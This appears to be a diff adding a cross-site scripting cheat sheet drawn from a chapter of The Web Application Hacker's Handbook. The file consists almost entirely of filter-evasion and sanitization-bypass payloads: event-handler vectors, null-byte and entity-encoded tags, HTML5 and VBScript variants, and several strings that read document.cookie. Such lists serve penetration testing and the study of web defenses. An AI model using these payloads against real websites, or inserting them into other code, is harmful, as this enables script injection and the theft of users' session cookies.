@@ -1,0 +1,158 @@
+// == Reference == // 
+   <Book/> : The Web Application Hacker's handbook 
+   <Chapter/> : Chapter 12, Attacking Users: Cross-Site Scripting
+   <Section/> : Finding and Exploiting XSS Vulenrabilities 
+
+
+// == Beating Signature-Based Filters == // 
+
+// 1 - Ways of Introducing Script Code
+	// 1.1 Script Tags
+		<object data=”data:text/html,<script>alert(1)</script>”>
+		<object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”> <a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”> Click here</a>
+
+	// 1.2 Event Handlers
+		<xml onreadystatechange=alert(1)>
+		<style onreadystatechange=alert(1)>
+		<iframe onreadystatechange=alert(1)>
+		<object onerror=alert('l33t')>
+		<object type=image src=valid.gif onreadystatechange=alert(1)></object>
+		<img type=image src=valid.gif onreadystatechange=alert(1)>
+		<input type=image src=valid.gif onreadystatechange=alert(1)>
+		<isindex type=image src=valid.gif onreadystatechange=alert(1)>
+		<script onreadystatechange=alert(1)>
+		<bgsound onpropertychange=alert(1)>
+		<body onbeforeactivate=alert(1)>
+		<body onactivate=alert(1)>
+		<body onfocusin=alert(1)>
+
+
+// 2 - Bypassing Filters: HTML
+	// 2.1 The Tag Name
+		<iMg onerror=alert(1) src=a>
+		<[%00]img onerror=alert(1) src=a>
+		<i[%00]mg onerror=alert(1) src=a>
+
+	// 2.2 Space Following the Tag Name
+		<img/onerror=alert(1) src=a>
+		<img[%09]onerror=alert(1) src=a>
+		<img[%0d]onerror=alert(1) src=a>
+		<img[%0a]onerror=alert(1) src=a>
+		<img/”onerror=alert(1) src=a>
+		<img/’onerror=alert(1) src=a>
+		<img/anyjunk/onerror=alert(1) src=a>
+
+	// 2.3 Attribute Names 
+		<img o[%00]nerror=alert(1) src=a>
+
+	// 2.4 Attribute Delimiters
+		<img onerror=”alert(1)”src=a>
+		<img onerror=’alert(1)’src=a>
+		<img onerror=`alert(1)`src=a>
+		<img src=`a`onerror=alert('l33t')>
+		<img/onerror=”alert(1)”src=a>
+
+	// 2.5 Attribute Values
+		<img onerror=a[%00]lert(1) src=a>
+		<img onerror=a&#x6c;ert(1) src=a>
+		<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
+		<img onerror=a&#x06c;ert(1) src=a>
+		<img onerror=a&#x006c;ert(1) src=a>
+		<img onerror=a&#x0006c;ert(1) src=a>
+		<img onerror=a&#108;ert(1) src=a>
+		<img onerror=a&#0108;ert(1) src=a>
+		<img onerror=a&#108ert(1) src=a>
+		<img onerror=a&#0108ert(1) src=a>
+
+	// 2.6 Tag Brackets
+		  %253cimg%20onerror=alert(1)%20src=a%253e
+		  %3cimg onerror=alert(1) src=a%3e
+		  «img onerror=alert(1) src=a»
+		  <<script>alert(1); //<</script>
+		  <script<{alert(1)}/></script>
+
+// 3 - HTML 5 
+		<input autofocus onfocus=alert(1)>
+		<input onblur=alert(1) autofocus><input autofocus>
+		<body onscroll=alert(1)><br><br>...<br><input autofocus>
+		</a onmousemove=alert(1)>
+		<video src=1 onerror=alert(1)>
+		<audio src=1 onerror=alert(1)>
+		<form id=test /><button form=test formaction=javascript:alert(1)>
+	  <event-source src=javascript:alert(1)>
+
+// 4 - Script Pseudo-Protocols
+		<object data=javascript:alert(1)>
+		<iframe src=javascript:alert(1)>
+		<embed src=javascript:alert(1)>
+
+// 5 - Dynamically Evaluated Styles
+		<x style=x:expression(alert(1))>
+		<x style=behavior:url(#default#time2) onbegin=alert(1)>
+
+// 6 - Script Code
+	// 6.1 Using JavaScript Escaping
+		<script>a\u006cert(1);</script>
+		<script>eval(‘a\u006cert(1)’);</script>
+		<script>eval(‘a\x6cert(1)’);</script>
+		<script>eval(‘a\154ert(1)’);</script>
+		<script>eval(‘a\l\ert\(1\)’);</script>
+
+	// 6.2 Dynamically Constructing Strings
+		<script>eval(‘al’+’ert(1)’);</script>
+		<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
+		<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
+
+	// 6.3 Alternatives to eval
+		<script>’alert(1)’.replace(/.+/,eval)</script>
+  		<script>function::[‘alert’](1)</script>
+
+	// 6.4 Alternatives to Dots
+		<script>alert(document[‘cookie’])</script>
+ 		<script>with(document)alert(cookie)</script>
+
+// 7 - Combining Multiple Techniques
+		<img onerror=eval(‘al&#x5c;u0065rt('l33t')’) src=a>
+		<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&
+		  #x29;&#x27;&#x29; src=a>
+
+// 8 - Using VBScript
+		<script language=vbs>MsgBox 1</script>
+		<img onerror=”vbs:MsgBox 1” src=a>
+		<img onerror=MsgBox+1 language=vbs src=a>
+
+// 9 - Combining VBScript and JavaScript
+		<script>execScript(“MsgBox 1”,”vbscript”);</script>
+		<script language=vbs>execScript(“alert(1)”)</script> 
+		<script>execScript(‘execScript “alert(1)”,”javascript”’,”vbscript”);</script>
+		<SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(“ALERT(1)”)) </SCRIPT>
+		<IMG ONERROR=”VBS:EXECSCRIPT LCASE(‘ALERT(1)’)” SRC=A>
+
+// 10 - Using Encoded Scripts
+		<img onerror=”VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@” src=a> <img language=”JScript.Encode” onerror=”#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@” src=a>
+
+
+// 11 - MISC
+		“><script >alert(document.cookie)</script >
+		“><ScRiPt>alert(document.cookie)</ScRiPt>
+		“%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+		“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+		%00“><script>alert(document.cookie)</script>
+
+
+// === Beating Sanitization == // 
+	<script><script>alert(1)</script>
+	<scr<script>ipt>alert(1)</script>
+	<scr<object>ipt>alert(1)</script>
+	var a = ‘foo\\’; alert(1);//’;
+	</script><script>alert(1)</script>
+	<script>var a = ‘</script><script>alert(1)</script>
+	foo&apos;; alert(1);//
+
+
+
+
+
+
+
+
